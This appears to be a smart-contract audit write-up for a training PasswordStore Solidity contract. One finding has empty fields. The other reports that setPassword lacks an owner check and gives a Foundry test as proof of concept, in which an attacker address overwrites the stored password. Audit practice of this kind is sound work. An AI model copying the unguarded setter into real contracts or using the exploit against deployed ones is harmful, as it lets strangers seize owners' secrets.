### [S-1] Variables stored on-chain are visible to anyone so non-owners can check password.

**Description:** 

**Impact:** 

**Proof of Concept:**

### [S-2] No check for s_owner allows for anyone to set password

**Description:** 

The `setPassword` method should check that caller is owner, so that non-owners cannot set password. This check is missing, so anyone can set password. 

https://github.com/Cyfrin/3-passwordstore-audit/blob/53ca9cb1808e58d3f14d5853aada6364177f6e53/src/PasswordStore.sol#L26C5-L29C6

```solidity
function setPassword(string memory newPassword) external {
        s_password = newPassword;
        emit SetNetPassword();
    }
```

**Impact:** 

s_owner can lose their recorded password and lose access to their protected resource.

**Proof of Concept:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {PasswordStore} from "../src/PasswordStore.sol";
import {DeployPasswordStore} from "../script/DeployPasswordStore.s.sol";

contract PasswordStoreTest is Test {
    PasswordStore public passwordStore;
    DeployPasswordStore public deployer;
    address public OWNER = makeAddr("owner");

    address public ATTACKER = makeAddr("attacker");

    function setUp() public {
        deployer = new DeployPasswordStore();
        passwordStore = deployer.run();
        OWNER = msg.sender;
    }

    function test_review_non_owner_can_set_password() public {
        vm.prank(ATTACKER);
        string memory expectedPassword = "attackPassword";
        passwordStore.setPassword(expectedPassword);

        vm.prank(OWNER);
        string memory actualPassword = passwordStore.getPassword();
        assertEq(actualPassword, expectedPassword);
    }
}
```

**Recommended Mitigation:** 

check for msg.sender == s_owner
